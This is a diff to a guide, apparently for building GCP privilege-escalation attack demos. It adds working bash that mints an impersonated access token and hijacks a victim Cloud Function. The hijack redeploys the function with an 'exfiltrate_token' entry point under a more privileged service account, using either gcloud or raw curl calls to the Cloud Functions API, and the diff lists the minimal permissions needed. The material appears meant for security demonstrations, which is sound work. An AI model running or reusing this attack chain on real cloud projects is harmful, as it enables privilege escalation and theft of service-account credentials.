@@ -364,40 +364,82 @@ else
 fi
 ```
 
+**ACCESS_TOKEN minting in `--api-only` mode**: Mint the token once in the first `--api-only` step that needs it (typically the observe/describe step that precedes the exploit), then reuse it throughout. Do not re-mint per API call:
+
+```bash
+# In the observe step (e.g. "read current function config"):
+if ! $USE_GCLOUD; then
+    ACCESS_TOKEN=$(gcloud auth print-access-token \
+        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
+    [ -z "$ACCESS_TOKEN" ] && { echo -e "${RED}✗ Failed to mint access token${NC}"; exit 1; }
+fi
+# Reuse $ACCESS_TOKEN in all subsequent --api-only curl calls.
+```
+
 **In the exploit step** (wherever gcloud is the natural tool), branch on `$USE_GCLOUD`:
 
 ```bash
 if $USE_GCLOUD; then
-    # gcloud mode — the natural attacker command
+    # gcloud mode — the natural attacker command.
+    # --build-service-account eliminates 4 gcloud-mechanic permissions by skipping
+    # gcloud's GetDefaultServiceAccount and project IAM validation preflights.
+    # Always specify it when the target SA is known.
     show_attack_cmd "$STARTING_SA_EMAIL" \
-        "gcloud functions deploy $VICTIM_FUNCTION_NAME ... --impersonate-service-account=$STARTING_SA_EMAIL"
+        "gcloud functions deploy $VICTIM_FUNCTION_NAME --source=$BUILD_DIR --runtime=python312 --entry-point=exfiltrate_token --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --impersonate-service-account=$STARTING_SA_EMAIL"
     gcloud functions deploy "$VICTIM_FUNCTION_NAME" \
-        ... \
+        --source="$BUILD_DIR" \
+        --runtime=python312 \
+        --entry-point=exfiltrate_token \
+        --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
         --impersonate-service-account="$STARTING_SA_EMAIL" \
+        --region="$REGION" \
         --quiet 2>/dev/null || { echo -e "${RED}✗ gcloud deploy failed${NC}"; exit 1; }
 else
-    # Raw API mode — minimal permissions only
-    # Step A: generateUploadUrl
+    # Raw API mode — minimal permissions only.
+    # ACCESS_TOKEN was minted in the observe step (Step 3 / whichever came first) — reuse it here.
+
+    # Step A: generateUploadUrl — get a signed URL to upload the source zip
     UPLOAD_INFO=$(curl -s -X POST \
         "https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME:generateUploadUrl" \
-        -H "Authorization: Bearer $STARTING_TOKEN" \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
         -H "Content-Type: application/json" -d '{}')
     UPLOAD_URL=$(echo "$UPLOAD_INFO" | jq -r '.uploadUrl')
 
-    # Step B: upload the zip to the signed URL
+    # Step B: upload the zip to the signed URL (no auth header — signed URL is self-contained)
     curl -s -X PUT "$UPLOAD_URL" \
         -H "Content-Type: application/zip" \
         --data-binary @"$BUILD_DIR/src.zip"
 
-    # Step C: PATCH the function's source
+    # Step C: PATCH the function's source via the raw CF v2 API
     STORAGE_SOURCE=$(echo "$UPLOAD_INFO" | jq -c '{storageSource: {bucket: .storageSource.bucket, object: .storageSource.object}}')
     PATCH_BODY=$(jq -n --argjson src "$STORAGE_SOURCE" \
         '{buildConfig: {source: $src, entryPoint: "exfiltrate_token"}}')
-    curl -s -X PATCH \
+    PATCH_RESPONSE=$(curl -s -X PATCH \
         "https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME?updateMask=buildConfig.source,buildConfig.entryPoint" \
-        -H "Authorization: Bearer $STARTING_TOKEN" \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
         -H "Content-Type: application/json" \
-        -d "$PATCH_BODY"
+        -d "$PATCH_BODY")
+    OPERATION_NAME=$(echo "$PATCH_RESPONSE" | jq -r '.name // empty')
+    [ -z "$OPERATION_NAME" ] && { echo -e "${RED}✗ PATCH failed — no operation returned${NC}"; echo "$PATCH_RESPONSE"; exit 1; }
+
+    # Step D: Poll the LRO until the function is ACTIVE.
+    # cloudfunctions.operations.get is required for this even with the raw API —
+    # the PATCH returns an async operation and there is no other way to know when
+    # the function is ready to invoke.
+    echo "Waiting for function update to complete..."
+    for i in $(seq 1 30); do
+        sleep 10
+        OP_RESPONSE=$(curl -s \
+            -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://cloudfunctions.googleapis.com/v2/${OPERATION_NAME}")
+        OP_DONE=$(echo "$OP_RESPONSE" | jq -r '.done // false')
+        if [ "$OP_DONE" = "true" ]; then
+            echo -e "${GREEN}✓ Function update complete${NC}"
+            break
+        fi
+        echo "  Still building... ($((i * 10))s elapsed)"
+    done
+    [ "$OP_DONE" != "true" ] && { echo -e "${RED}✗ Timed out waiting for function update${NC}"; exit 1; }
 fi
 ```
 
@@ -406,18 +448,14 @@ fi
 ```bash
 if $USE_GCLOUD; then
     echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
-    echo "  This demo used 'gcloud functions deploy', which is the natural tool for this"
-    echo "  attack and shows the clearest command sequence. However, gcloud makes extra"
-    echo "  preflight calls that require permissions beyond the attack's true minimum:"
+    echo "  This demo used 'gcloud functions deploy --build-service-account=...', which"
+    echo "  is the natural tool for this attack. The --build-service-account flag already"
+    echo "  eliminates 4 gcloud preflights. The 2 remaining gcloud-mechanic permissions"
+    echo "  (included in starting_sa's role but not needed by the raw API) are:"
     echo ""
-    echo "    cloudbuild.builds.get           — gcloud queries Cloud Build's"
-    echo "                                      GetDefaultServiceAccount endpoint"
-    echo "    resourcemanager.projects.getIamPolicy — gcloud validates the project IAM policy"
-    echo "    run.services.getIamPolicy       — gcloud reads Cloud Run IAM post-deploy"
-    echo "    run.services.setIamPolicy       — gcloud sets Cloud Run IAM for"
-    echo "                                      --no-allow-unauthenticated"
+    echo "    cloudfunctions.functions.get  — gcloud calls GetFunction before every deploy"
+    echo "    resourcemanager.projects.get  — gcloud calls GET /v1/projects/{id} unconditionally"
     echo ""
-    echo "  These are included in starting_sa's role by Terraform (labeled as gcloud mechanics)."
     echo "  To see the attack with only the true minimum permissions, run:"
     echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
 fi
